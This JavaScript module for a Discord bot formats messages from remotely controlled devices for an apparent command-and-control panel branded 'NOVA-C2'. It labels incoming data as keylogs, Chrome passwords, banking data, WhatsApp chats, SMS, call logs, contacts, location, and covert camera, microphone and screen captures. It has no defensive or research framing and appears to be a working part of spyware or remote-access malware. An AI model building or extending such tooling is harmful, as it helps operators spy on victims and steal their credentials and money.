import { EmbedBuilder } from 'discord.js'
import { C, E, ts } from '../utils/index.js'
import { ICONS } from '../icons.js'

const STYLES = [
  { pattern: /^:x:/,                   color: C.blood,     icon: '❌',   title: 'FAILED' },
  { pattern: /^:shield:/,              color: C.gold,      icon: '🛡️',  title: 'DEVICE ADMIN' },
  { pattern: /^:microscope:/,          color: C.purple,    icon: '🔬',   title: 'PROCESSES' },
  { pattern: /^:tv:/,                  color: C.electric,  icon: '📺',   title: 'SCREEN CAPTURE' },
  { pattern: /^:package:/,             color: C.gold,      icon: '📦',   title: 'UPDATE' },
  { pattern: /^:arrow_down:/,          color: C.electric,  icon: '⬇️',  title: 'DOWNLOADING' },
  { pattern: /^:green_circle:/,        color: C.venom,     icon: '🟢',   title: 'DEVICE ONLINE' },
  { pattern: /^:red_circle:/,          color: C.blood,     icon: '🔴',   title: 'CONNECTION LOST' },
  { pattern: /^:warning:/,             color: C.gold,      icon: '⚠️',  title: 'WARNING' },
  { pattern: /^:round_pushpin:/,       color: C.electric,  icon: '📍',   title: 'LOCATION' },
  { pattern: /^:camera:/,              color: C.blood,     icon: '📷',   title: 'CAMERA' },
  { pattern: /^:satellite:|^:signal:/, color: C.purple,    icon: '📡',   title: 'STREAM' },
  { pattern: /^:white_check_mark:|^✅/,color: C.venom,     icon: '✅',   title: 'SUCCESS' },
  { pattern: /^:information_source:/,  color: C.info,      icon: 'ℹ️',   title: 'INFO' },
  { pattern: /^📄/,                     color: C.gold,      icon: '📄',   title: 'DOCUMENT' },
  { pattern: /^💬/,                     color: C.purple,    icon: '💬',   title: 'WHATSAPP' },
  { pattern: /^🔐/,                     color: C.gold,      icon: '🔐',   title: 'CHROME PASSWORDS' },
  { pattern: /^🏦/,                     color: C.gold,      icon: '🏦',   title: 'BANKING' },
  { pattern: /^:clipboard:/,           color: C.info,      icon: '📋',   title: 'CLIPBOARD' },
  { pattern: /^:key:/,                 color: C.gold,      icon: '🔑',   title: 'KEYLOG' },
  { pattern: /^:satellite_antenna:/,   color: C.purple,    icon: '📡',   title: 'CONNECTION' },
  { pattern: /^:battery:/,             color: C.venom,     icon: '🔋',   title: 'BATTERY' },
  { pattern: /^:headphone:/,           color: C.purple,    icon: '🎧',   title: 'MICROPHONE' },
  { pattern: /^:telephone:/,           color: C.electric,  icon: '📞',   title: 'CALL LOG' },
  { pattern: /^:envelope:/,            color: C.electric,  icon: '✉️',   title: 'SMS' },
  { pattern: /^:busts_in_silhouette:/, color: C.purple,    icon: '👥',   title: 'CONTACTS' },
  { pattern: /^:heartbeat:/,           color: C.neon,      icon: '💓',   title: 'HEARTBEAT', skip: true },
  { pattern: /^:green_heart:/,         color: C.venom,     icon: '💚',   title: 'ALIVE', skip: true },
]

export function formatDeviceResponse(content) {
  if (!content || content.length < 3) return null
  const firstLine = content.split('\n')[0].trim()
  for (const s of STYLES) {
    if (s.pattern.test(firstLine)) {
      if (s.skip) return null
      const lines = content.split('\n')
      const rest = lines.slice(1).filter(l => l.trim()).join('\n').slice(0, 4000)
      return {
        embeds: [new EmbedBuilder()
          .setColor(s.color)
          .setTitle(`${s.icon} ${s.title}`)
          .setDescription(rest || firstLine)
          .setFooter({ text: `NOVA-C2 ⚡ ${ts()}`, iconURL: ICONS?.footer || undefined })
        ]
      }
    }
  }
  return null
}
